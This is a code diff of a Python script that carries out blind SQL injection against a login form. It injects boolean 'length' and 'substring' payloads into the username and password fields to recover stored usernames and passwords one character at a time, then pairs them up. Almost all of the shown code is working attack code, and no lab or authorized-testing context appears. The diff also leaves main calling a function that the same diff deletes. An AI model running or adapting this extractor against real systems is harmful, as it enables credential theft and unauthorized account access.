@@ -32,126 +32,48 @@ def get_answer(params):
 
         return False
 
-def getUsersOptomized():
-    partial = []
-    done = []
 
-    i = 97
-    while i <= 122:
-        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
-        if get_answer(params):
-            done.append(str(chr(i)))
-        params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
-        if get_answer(params):
-            partial.append(str(chr(i)))
-        i += 1
-
-    
-    i = 97
-    while i <= 122:
-        for word in partial:
-            params = {'userName': "' or length(userName)=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                #partial.remove(word)
-                done.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)!=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                #partial.remove(word)
-                partial.append(word + str(chr(i)))
-        i += 1
-    
-    i = 97
-    while i <= 122:
-        for word in partial:
-            
-            params = {'userName': "' or length(userName)!=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                partial.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                done.append(word + str(chr(i)))
-        i += 1
-    
-    
-    i = 97
-    while i <= 122:
-        for word in partial:
-            
-            params = {'userName': "' or length(userName)!=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                partial.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                done.append(word + str(chr(i)))
-        i += 1
-    
-
-    i = 97
-    while i <= 122:
-        
-        for word in partial:
-            
-            params = {'userName': "' or length(userName)!=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                partial.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                done.append(word + str(chr(i)))
-        i += 1
-
-    i = 97
-    while i <= 122:
-        for word in partial:
-            
-            params = {'userName': "' or length(userName)!=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                partial.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                done.append(word + str(chr(i)))
-        i += 1
-
-    i = 97
-    while i <= 122:
-        for word in partial:
-            
-            params = {'userName': "' or length(userName)!=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                partial.append(word + str(chr(i)))
-            params = {'userName': "' or length(userName)=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
-            if get_answer(params):
-                done.append(word + str(chr(i)))
-        i += 1
-
-
-    return done
 def getUsersBetter(max_length):
-    partial = []
-    done = []
+    partialUsers = []
+    doneUsers = []
+    partialPasswords = []
+    donePasswords = []
 
     for i in iter.chain(range(48,58), range(97, 123)):
         params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
         if get_answer(params):
-            done.append(str(chr(i)))
+            doneUsers.append(str(chr(i)))
         params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
         if get_answer(params):
-            partial.append(str(chr(i)))
-        
+            partialUsers.append(str(chr(i)))
+        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        if get_answer(params):
+            donePasswords.append(str(chr(i)))
+        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        if get_answer(params):
+            partialPasswords.append(str(chr(i)))
     
     for x in range(1, max_length + 1):
-        for word in partial:
+        for word in partialUsers:
             for i in iter.chain(range(48,58), range(97, 123)):
                 params = {'userName': "' or length(userName)!=" + str(x) + " and substring(userName, 1, " + str(x) + ")=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
                 if get_answer(params):
-                    partial.append(word + str(chr(i)))
+                    partialUsers.append(word + str(chr(i)))
                 params = {'userName': "' or length(userName)=" + str(x) + " and substring(userName, 1, " + str(x) + ")=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
                 if get_answer(params):
-                    if str(word + str(chr(i))) not in done:
-                        done.append(word + str(chr(i)))
+                    if str(word + str(chr(i))) not in doneUsers:
+                        doneUsers.append(word + str(chr(i)))
                 
-                    #print(word + str(chr(i)))
+        for word in partialPasswords:
+            for i in iter.chain(range(48,58), range(97, 123)):
+                params = {'username': '', 'password': "' or length(password)="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
+                if get_answer(params):
+                    donePasswords.append(word + str(chr(i)))
+                params = {'username': '', 'password': "' or length(password)!="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
+                if get_answer(params):
+                    partialPasswords.append(word + str(chr(i)))
 
-    return done
+    return doneUsers, donePasswords
 def getPasswords(max_length):
     partial = []
     done = []
@@ -187,8 +109,8 @@ def matchPasswords(users, passwords):
                     print(user, ": ", password) 
 def main():
     #users = getUsersOptomized()
-    users = getUsersBetter(8)
-    #print( users )
-    passwords = getPasswords(8)
-    matchPasswords(users, passwords)
+    #users = getUsersBetter(8)
+    print( getUsersOptomized(8) )
+    #passwords = getPasswords(8)
+    #matchPasswords(users, passwords)
 main()
